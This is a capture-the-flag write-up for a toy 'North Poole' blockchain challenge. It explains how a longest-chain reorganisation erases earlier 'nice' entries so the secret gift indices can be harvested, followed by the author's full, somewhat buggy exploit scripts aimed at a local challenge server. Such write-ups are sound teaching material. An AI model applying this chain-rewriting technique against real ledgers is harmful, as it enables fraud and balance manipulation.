### Day 6



### My Solution (Understanding the challenge)

This is one of my favourite challenges. In `santa.py`, the process that opens and sends the flag generates a random 16-byte value called `SECRET_GIFT`. It checks the blockchain for transactions where the letter has `"santa"` as its destination and type as letter.

If the transaction is a letter request with secret_index #[index] in its content as below:

```py
if not gift_value and (match := re.search(r"secret index #([0-9]+)", letter["letter"])):
    index = int(match.group(1))
    if 0 <= index < len(SECRET_GIFT):
        gift_value = SECRET_GIFT[index]
```
`santa.py` will send one character of `SECRET_GIFT` per request, and the character it sends depends on the index requested in the transaction (from the letter content). `santa.py` will only send the full flag if `SECRET_GIFT` is sent back by a user as a letter type in a request transaction.

Since the lenght of `SECRET_GIFT` is 32, we just need to make 32 requests, each asking for a different index of `SECRET_GIFT`, collect all these characters, and then send the complete value back to `santa.py` to retrieve the flag. In total, this requires 33 requests to the blockchain.

There is a problem, however: we can’t submit a request if our balance is less than 0 .

```py
balances = get_nice_balances(block)
if any(balance < 0 for balance in balances.values()):
  return jsonify({"error": "negative balance"}), 400
```


### And How do we get our balance ?

```py
def get_nice_balances(block):
    balances = {name: 1 for name in IDENTITIES}

    chain = [block]
    current_hash = block["prev_hash"]
    while current_hash in BLOCKS:
        blk = BLOCKS[current_hash]
        chain.append(blk)
        current_hash = blk["prev_hash"]
    chain.reverse()

    for blk in chain:
        nice_person = blk.get("nice")
        if nice_person:
            balances[nice_person] = balances.get(nice_person, 0) + 1

        for tx in blk["txs"]:
            tx_type = tx.get("type")
            src = tx.get("src")
            dst = tx.get("dst")
            if tx_type == "gift" and src == "santa":
                balances[src] = balances.get(src, 0) + 1
                balances[dst] = balances.get(dst, 0) - 1
            elif tx_type == "transfer":
                amount = tx.get("transfer", 0)
                balances[src] = balances.get(src, 0) - amount
                balances[dst] = balances.get(dst, 0) + amount

    return balances
```


Each user is assigned an initial balance of 1, then all transactions ever made on the block are checked. If a user has ever made a transfer or requested a gift (letter to santa ) from `santa.py`, 1 is deducted from their balance per transaction.

This means we can only make two gift requests or transfers before our balance drops below the 0 threshold and we lose the ability to submit further requests. Since `santa.py` also checks the balance before responding with an index (specifically `nice_balances.get(child, 0) <= 0`), we can only retrieve one index from `santa.py` out of the two requests we are allowed to make.

Even if we were able to take over other users’ accounts on the blockchain, we still wouldn’t have enough balance to proceed (there are only about 17 users).

However, as we can see below, our balance can be increased further if we can create multiple “nice” transactions on the blockchain.


```py
    for blk in chain:
        nice_person = blk.get("nice")
        if nice_person:
            balances[nice_person] = balances.get(nice_person, 0) + 1
```



### How do we increase Our nice score?

Remember, we need a balance of at least **33**:  
32 to retrieve all the indices of `SECRET_GIFT`, and the 33rd to request the flag. If we can increase our balance from 1 to 33 using *nice* transactions on the blockchain, that would solve the problem.

So how can we do that? We need to look for where and how *nice* is being added.

Note Each transaction block submitted to the blockchain look like this:

```json
 {
    "index": head_block["index"] + 1,
    "prev_hash": hash_block(head_block),
    "nonce": 0,
    "txs": txs,
    "nice": nice,
}
```

If we manage to add 32 `nice` entries on the blockchain that reference our username, our balance would increase to 33, which is enough to obtain the flag. However, we can only create transactions where our username appears as the `src`, since we are the only ones who possess the private key required to sign transactions for that account.

Because of the validation check shown below, we are not allowed to mark our own username as `nice`. As a result, we cannot directly inflate the `nice` count on the blockchain to increase our balance.

```py
  if tx.get("src") == nice_person:
      return jsonify({"error": "nice person cannot be tx src"}), 400
```
### Mining
We can, however, submit signed transactions belonging to other users to the blockchain and control their `nice` value by solving a specific equation. By doing this, we can collect other users’ signed transactions, set our username as the `nice` value, and submit them to the blockchain.

Using this approach, we only need 32 such requests to reach the minimum balance required to retrieve the flag.

There is an additional restriction, though: our username is allowed to appear as a `nice` value at most 10 times on the blockchain. Any further transactions beyond this limit are rejected.

```py
nice_person = blk.get("nice")
if nice_person:
    nice_counts[nice_person] = nice_counts.get(nice_person, 0) + 1
    if nice_counts[nice_person] > 10:
        return jsonify({"error": "abuse of nice list detected"}), 400
```
We now have a way to increase our balance to 11, but this is still insufficient to retrieve `SECRET_GIFT` and the flag.

### Making the Blockchain Forget

The blockchain determines how many *nice* credits we have by iterating over all transactions and counting how many times our username appears as a `nice` value. But what if we can make it forget?

Suppose we accumulate 10 `nice` entries on the blockchain and request 10 indices from Santa. If we can then make the blockchain forget that these transactions ever happened—and that we have already reached the `nice` limit—we could repeat the process.  
We get another 10 `nice` entries, request 10 more indices (bringing us to 20), and continue this cycle until we reach all 32 required indices.

To understand how this might be possible, we need to look at the following code snippet and see how the blockchain traverses its blocks. The program selects the block with the highest index from its `BLOCKS` storage and treats it as the current chain head. It blindly trusts this block and walks through its previous blocks (`prev_block`) to check for repeated `nice` values.
```
def get_best_chain_block():
    best_hash = None
    best_index = -1
    for blk_hash, blk in BLOCKS.items():
        if blk["index"] > best_index:
            best_index = blk["index"]
            best_hash = blk_hash
    return best_hash
```

If we can add blocks up to a height that predates when our `nice` entries started being counted, we can then create a new block with the highest index that contains no record of us ever adding our username as a `nice` value.
When the blockchain calls `get_best_chain_block`, the highest-index block we just added is selected as the chain head. As it traverses the chain from that block, it only encounters transactions that do not contain our username as a `nice` value.

### Exploit  

The `rebase(i)` function defined here creates a new chain, effectively causing the blockchain to forget that our `nice` balance ever existed.

```py
# blockchain.py
#!/usr/local/bin/python -u
import hashlib
import json
import os
import random
import re
import time
import uuid
from pathlib import Path

import requests
from cryptography.hazmat.primitives import serialization

NORTH_POOLE = "http://127.0.0.1"
ELF_NAME = "ola"
MY_ACCOUNT = "hacker"
LETTER_HEADER = "Dear Santa,\n\nFor christmas this year I would like "
keys = {}

key_path = Path("/challenge/keys") / MY_ACCOUNT / "key"
keys["hacker"] = serialization.load_ssh_private_key(key_path.read_bytes(), password=None)

DIFFICULTY = 16
DIFFICULTY_PREFIX = "0" * (DIFFICULTY // 4)
CHILDREN = [path.name for path in Path("/challenge/keys").iterdir()]
NICE = list()  # The nice list doesn't care about your fancy set O(1) operations






def get_first_blocks():
    while True:
        try:
            # print("[santa] looking for new letters...")

            head_resp = requests.get(f"{NORTH_POOLE}/block")
            head_resp.raise_for_status()
            head_json = head_resp.json()
            head_block = head_json["block"]
            head_hash = head_json["hash"]

            chain = [head_block]
            current_hash = head_block["prev_hash"]
            while current_hash:
                current_resp = requests.get(f"{NORTH_POOLE}/block", params={"hash": current_hash})
                if current_resp.status_code != 200:
                    break
                current_json = current_resp.json()
                block = current_json["block"]
                chain.append(block)
                current_hash = block["prev_hash"]
            chain.reverse()

            for block in chain:
                for tx in block.get("txs", []):
                    if  tx.get("dst") == "santa" and tx.get("type") == "letter":
                        return block
            break
        except Exception as e:
            print(e)

def mine_own_letter(txs, l, i):
    while True:
        try:
            tx_resp = requests.get(f"{NORTH_POOLE}/txpool")
            tx_resp.raise_for_status()
            tx_json = tx_resp.json()

            head_hash = tx_json["hash"]
            head_resp = requests.get(f"{NORTH_POOLE}/block", params={"hash": head_hash})
            head_resp.raise_for_status()
            head_json = head_resp.json()
            head_block = head_json["block"]

            if l == False :
                txses =[txs]


            block = {
                    "index": head_block["index"] + 1,
                    "prev_hash": hash_block(head_block),
                    "nonce": 0,
                    "txs": txses,
                    "nice": None,
                }
            nonce = 0
            while True:
                block["nonce"] = nonce
                block_hash = hash_block(block)
                if block_hash.startswith(DIFFICULTY_PREFIX):
                    break
                nonce += 1

            resp = requests.post(f"{NORTH_POOLE}/block", json=block)
            if resp.status_code == 200:
                # print(f"Response For {i} : {resp.text}")
                return block['index'], txs['nonce']
            else:
                print(f"[{ELF_NAME}] block rejected: {resp.text}")
                return 0
        except Exception as e:
            print(f"[{ELF_NAME}] exception while mining: {e}")


def extract_secrets(nonces, prev_len):
    """
    Try to extract gifts for all nonces.
    If missing gifts exist:
        - sleep a bit to let Santa catch up
        - re-check
        - resend only the missing letters
    """
    def get_full_chain():
        head_resp = requests.get(f"{NORTH_POOLE}/block")
        head_resp.raise_for_status()
        head = head_resp.json()["block"]

        # walk chain
        chain = []
        blk = head
        while blk:
            chain.append(blk)
            prev = blk.get("prev_hash")
            if not prev:
                break
            r = requests.get(f"{NORTH_POOLE}/block", params={"hash": prev})
            if r.status_code != 200:
                break
            blk = r.json()["block"]
        return chain

    def scan_chain():
        found = {}   # nonce => gift
        chain = get_full_chain()

        for block in chain:
            for tx in block.get("txs", []):
                nonce_val = tx.get("nonce")
                if nonce_val and nonce_val.endswith("-gift"):
                    base = nonce_val[:-5]  # strip "-gift"
                    if base in nonces:
                        found[base] = tx.get("gift")
        return found

    # First scan
    found = scan_chain()

    # If incomplete, sleep and retry
    if len(found) != len(nonces):
        print("Not all secrets found yet… sleeping for blockchain catch-up")
        time.sleep(70)              # <-- YOU CAN ADJUST THIS DELAY
        found = scan_chain()        # retry scan

    # Find missing ones
    missing = [n for n in nonces if n not in found]

    if not missing:
        # Return secrets in original order
        return [found[n] for n in nonces]

    # Still missing some → resend those letters
    print("Still missing gifts for:", missing)

    for n in missing:
        idx = nonces.index(n) 
        print(f"Resending letter for nonce={n} (index={idx + prev_len})")
        tx = send_letter(f"secret index #{idx + prev_len}", "santa", n+"kp")
        nonces[idx] = n+"kp"
        mine_own_letter(tx, False, idx)
 
    found2 = scan_chain()
    missing = [n for n in nonces if n not in found2]
    if missing:
        time.sleep(60)
        found2 = scan_chain()
    missing = [n for n in nonces if n not in found2]
    if missing:
        time.sleep(60)

    for t in poll_for_gift():
        mine_own_letter(t, False, 0)  
    found2 = scan_chain()
    
    found.update(found2)

    # Return what we have (missing ones will be None)
    return [found.get(n) for n in nonces]

def poll_for_gift():
    ola = []
    while True:
        try:
            tx_resp = requests.get(f"{NORTH_POOLE}/txpool")
            tx_resp.raise_for_status()
            tx_json = tx_resp.json()
            txs = tx_json["txs"]

            for tx in txs:
                if tx["type"] == "gift" and tx["dst"] == MY_ACCOUNT:
                    ola.append(tx)
            return ola
        except Exception as e:
            print(e)


def send_letter(message, dest, nonce):
    
    tx = {
        "src": MY_ACCOUNT,
        "dst": dest,  # the bot listens for letters addressed to it
        "type": "letter",
        "nonce": nonce,
        "letter": LETTER_HEADER + message
    }

    msg = json.dumps(tx, sort_keys=True, separators=(",", ":"))
    digest = hashlib.sha256(msg.encode()).digest() 
    hashs = str(hashlib.sha256(msg.encode()).hexdigest())
    tx["sig"] = keys[MY_ACCOUNT].sign(digest).hex()


    return tx

def hash_block(block: dict) -> str:
    block_str = json.dumps(block, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(block_str.encode()).hexdigest()


def mine_block(parent, txs):
    block = {
        "index": parent["index"] + 1,
        "prev_hash": hash_block(parent),
        "nonce": 0,
        "txs": [txs],
        "nice": None,
    }

    nonce = 0
    while True:
        block["nonce"] = nonce
        block_hash = hash_block(block)
        if block_hash.startswith(DIFFICULTY_PREFIX):
            break
        nonce += 1

    resp = requests.post(f"{NORTH_POOLE}/block", json=block)
    if resp.status_code == 200:
        # print(f"[{ELF_NAME}] mined block {block['index']} ({block_hash})")
        return block
    else:
        print(f"Block failed {resp.text}")
        

def craft_message():
    nonce = str(uuid.uuid4())
    tx = {
        "src": MY_ACCOUNT,
        "dst": "ash",  # the bot listens for letters addressed to it
        "type": "letter",
        "nonce": nonce,
        "letter": LETTER_HEADER
    }

    msg = json.dumps(tx, sort_keys=True, separators=(",", ":"))
    digest = hashlib.sha256(msg.encode()).digest() 
    hashs = str(hashlib.sha256(msg.encode()).hexdigest())
    tx["sig"] = keys[MY_ACCOUNT].sign(digest).hex()

    return tx

def check_nice():
    nice_counts = {}
    head_resp = requests.get(f"{NORTH_POOLE}/block")
    head_resp.raise_for_status()
    head_json = head_resp.json()
    head_block = head_json["block"]
    head_hash = head_json["hash"]

    chain = [head_block]
    current_hash = head_block["prev_hash"]
    while current_hash:
        current_resp = requests.get(f"{NORTH_POOLE}/block", params={"hash": current_hash})
        if current_resp.status_code != 200:
            break
        current_json = current_resp.json()
        block = current_json["block"]
        nice_person = block.get("nice")
        nice_counts[nice_person] = nice_counts.get(nice_person, 0) + 1
        current_hash = block["prev_hash"]
    print(f"Nice Score is {nice_counts.get('hacker', 0)}")  
    return nice_counts.get('hacker', 0)




def rebase(i):
    block = get_first_blocks() 
    for i in range(i): 
        tx = craft_message() 
        block = mine_block(block, tx)
    
    while check_nice() > 3:
        for _ in range(10):
            tx = craft_message() 
            block = mine_block(block, tx)
    return block
```

The attack script Imports 

```py
# attack.py

#!/usr/local/bin/python -u
import hashlib
import json
import os
import random
import time
from pathlib import Path
import uuid
from pathlib import Path
import threading
from cryptography.hazmat.primitives import serialization
import requests
from blockchain import rebase, extract_secrets

NORTH_POOLE = "http://127.0.0.1"
ELF_NAME = "ola"
MY_ACCOUNT = "hacker"
LETTER_HEADER = "Dear Santa,\n\nFor christmas this year I would like "

keys = {}


key_path = Path("/challenge/keys") / MY_ACCOUNT / "key"
keys["hacker"] = serialization.load_ssh_private_key(key_path.read_bytes(), password=None)

DIFFICULTY = 16
DIFFICULTY_PREFIX = "0" * (DIFFICULTY // 4)
CHILDREN = [path.name for path in Path("/challenge/keys").iterdir()]
NICE = list()  # The nice list doesn't care about your fancy set O(1) operations


def hash_block(block: dict) -> str:
    block_str = json.dumps(block, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(block_str.encode()).hexdigest()


print(f"Elf {ELF_NAME} starting to mine for the North-Poole... difficulty={DIFFICULTY}")


def mine_block():
    while True:
        try:
            # print(f"[{ELF_NAME}] mining a new block...")
            tx_resp = requests.get(f"{NORTH_POOLE}/txpool")
            tx_resp.raise_for_status()
            tx_json = tx_resp.json()
            txs = tx_json["txs"]
            head_hash = tx_json["hash"]

            head_resp = requests.get(f"{NORTH_POOLE}/block", params={"hash": head_hash})
            head_resp.raise_for_status()
            head_json = head_resp.json()
            head_block = head_json["block"]

            block = {
                "index": head_block["index"] + 1,
                "prev_hash": hash_block(head_block),
                "nonce": 0,
                "txs": txs,
                "nice": "hacker",
            }

            nonce = 0
            while True:
                block["nonce"] = nonce
                block_hash = hash_block(block)
                if block_hash.startswith(DIFFICULTY_PREFIX):
                    break
                nonce += 1

            resp = requests.post(f"{NORTH_POOLE}/block", json=block)
            if resp.status_code == 200:
                # print(f"[{ELF_NAME}] mined block {block['index']} ({block_hash})")
                return block['index']

            else:
                print(f"[{ELF_NAME}] block rejected: {resp.text}")
        except Exception as e:
            print(f"[{ELF_NAME}] exception while mining: {e}")



def send_letter(message, dest, nonce):
    
    tx = {
        "src": MY_ACCOUNT,
        "dst": dest,  # the bot listens for letters addressed to it
        "type": "letter",
        "nonce": nonce,
        "letter": LETTER_HEADER + message
    }

    msg = json.dumps(tx, sort_keys=True, separators=(",", ":"))
    digest = hashlib.sha256(msg.encode()).digest() 
    hashs = str(hashlib.sha256(msg.encode()).hexdigest())
    tx["sig"] = keys[MY_ACCOUNT].sign(digest).hex()


    return tx
        #mine(hashs)
    

def check_nice():
    nice_counts = {}
    head_resp = requests.get(f"{NORTH_POOLE}/block")
    head_resp.raise_for_status()
    head_json = head_resp.json()
    head_block = head_json["block"]
    head_hash = head_json["hash"]

    chain = [head_block]
    current_hash = head_block["prev_hash"]
    while current_hash:
        current_resp = requests.get(f"{NORTH_POOLE}/block", params={"hash": current_hash})
        if current_resp.status_code != 200:
            break
        current_json = current_resp.json()
        block = current_json["block"]
        nice_person = block.get("nice")
        nice_counts[nice_person] = nice_counts.get(nice_person, 0) + 1
        current_hash = block["prev_hash"]
    print(f"Nice Score is {nice_counts.get('hacker', 0)}")  
    return nice_counts.get('hacker', 0)


def get_index():
        head_resp = requests.get(f"{NORTH_POOLE}/block")
        head_resp.raise_for_status()
        head_json = head_resp.json()
        head_block = head_json["block"]
        return head_block["index"]

def mine_own_letter(txs, l, i):
    while True:
        try:
            tx_resp = requests.get(f"{NORTH_POOLE}/txpool")
            tx_resp.raise_for_status()
            tx_json = tx_resp.json()

            head_hash = tx_json["hash"]
            head_resp = requests.get(f"{NORTH_POOLE}/block", params={"hash": head_hash})
            head_resp.raise_for_status()
            head_json = head_resp.json()
            head_block = head_json["block"]

            if l == False :
                txses =[txs]


            block = {
                    "index": head_block["index"] + 1,
                    "prev_hash": hash_block(head_block),
                    "nonce": 0,
                    "txs": txses,
                    "nice": None,
                }
            nonce = 0
            while True:
                block["nonce"] = nonce
                block_hash = hash_block(block)
                if block_hash.startswith(DIFFICULTY_PREFIX):
                    break
                nonce += 1

            resp = requests.post(f"{NORTH_POOLE}/block", json=block)
            if resp.status_code == 200:
                # print(f"Response For {i} : {resp.text}")
                return block['index'], txs['nonce']
            else:
                print(f"[{ELF_NAME}] block rejected: {resp.text}")
                return 0
        except Exception as e:
            print(f"[{ELF_NAME}] exception while mining: {e}")


def get_balances():
    balances_resp = requests.get(f"{NORTH_POOLE}/balances")#, params={"hash": current_hash})
    balances_resp.raise_for_status()
    balances_json = balances_resp.json()
    nice_balances = balances_json.get("balances", {})
    print(f"Balance is {nice_balances['hacker']}")
    return nice_balances['hacker']

def poll_for_gift():
    ola = []
    while True:
        try:
            tx_resp = requests.get(f"{NORTH_POOLE}/txpool")
            tx_resp.raise_for_status()
            tx_json = tx_resp.json()
            txs = tx_json["txs"]

            for tx in txs:
                if tx["type"] == "gift" and tx["dst"] == MY_ACCOUNT:
                    ola.append(tx)
            return ola
        except Exception as e:
            print(e)


def get_full_chain():
    head_resp = requests.get(f"{NORTH_POOLE}/block")
    head_resp.raise_for_status()
    head = head_resp.json()["block"]

    # walk chain
    chain = []
    blk = head
    while blk:
        chain.append(blk)
        prev = blk.get("prev_hash")
        if not prev:
            break
        r = requests.get(f"{NORTH_POOLE}/block", params={"hash": prev})
        if r.status_code != 200:
            break
        blk = r.json()["block"]
    return chain

if get_balances() <= 0 and check_nice() < 10:
    mine_block()





nonce_sent = []
secrets = []
number = 0

if get_balances() == 0:
    mine_block()




def fast_loop():
    i = 0
    secrets = []
    nonce_sent = []
    number = get_index()
    entered = 0
    sent_number = 0

    while i < 33:
        nice = check_nice()
        bal = get_balances()

        if bal <= 0 and nice < 10:
            mine_block()


        print(f"Running number {i}")



        # --- conditions to trigger extraction + rebase ---
        trigger = (
            (i > 0 )
            and (nice > 7 
            or bal <= 0) or (i > 31)
        )

        if trigger:

            if  len(nonce_sent) == 0:
                continue
            
            print(nonce_sent)
            extracted = extract_secrets(nonce_sent, len(secrets))
            # if len(extracted) != len(nonce_sent):
            #     for t in poll_for_gift():
            #         number, _ = mine_own_letter(t, False, 0)
            #     extracted = extract_secrets(nonce_sent)
            
            # safe commit
            secrets.extend(extracted)
            nonce_sent.clear()
            print("Extracted secrets:", secrets)

            rebase(number + i + 10)
            continue

        # --- Normal mining sequence ---
        if  check_nice() < 10:
            mine_block()

        nonce = str(uuid.uuid4())
        tx = send_letter(f"secret index #{i}", "santa", nonce)

        # Try to include letter into chain
        if check_nice() > 9 or get_balances() <= 0:
            continue
        number, nonced = mine_own_letter(tx, False, i)
        if  number == 0:
            print("Letter not confirmed, skipping nonce")
            continue
        else:
            nonce_sent.append(nonced)
            
        # mine filler blocks
        for _ in range(5):
            nonce2 = str(uuid.uuid4())
            tx1 = send_letter("hey", "ash", nonce2)
            mine_own_letter(tx1, False, 0)

        # gifts
        if check_nice() > 9 or get_balances() <= 0:
            continue
        for t in poll_for_gift():
            number, _ = mine_own_letter(t, False, 0)

        i += 1
        

    return secrets


def main():
    secrets = fast_loop()

    print("".join(secrets))
    bola = "".join(secrets)

    f = open("ola.txt", "w")
    f.write(bola)
    f.close()
    if get_balances() <= 0 or check_nice() > 8:
        rebase(number + i + 10)

    nonce = str(uuid.uuid4())
    tx = send_letter(f"secret {bola}","santa", nonce) 

    mine_own_letter(tx)
    for _ in range(5):
        nonce2 = str(uuid.uuid4())
        tx1 = send_letter(f"hey","ash", nonce2) 
        mine_own_letter(tx1)
    txs = poll_for_gift()
    number, _  = mine_own_letter(txs, l=True)
    time.sleep(20)




    # bola = "ecb4b3416cbfe283196e645befc2b699"

    nonce = str(uuid.uuid4())
    tx = send_letter(f"secret {bola}","santa", nonce) 

    if get_balances() <= 0 and check_nice() < 10:
        mine_block()

    number, nonced = mine_own_letter(tx, False, i)
    for _ in range(5):
        nonce2 = str(uuid.uuid4())
        tx1 = send_letter(f"hey","ash", nonce2) 
        number, nonced = mine_own_letter(tx1, False, i)

    if get_balances() <= 0 and check_nice() < 10:
        mine_block()

    for t in poll_for_gift():
        number, _ = mine_own_letter(t, False, 0)
    time.sleep(20)

    f = open("ola.txt", "w")
    f.write(str(get_full_chain()))
    f.close()


if __name__ == '__main__':
  main()

```
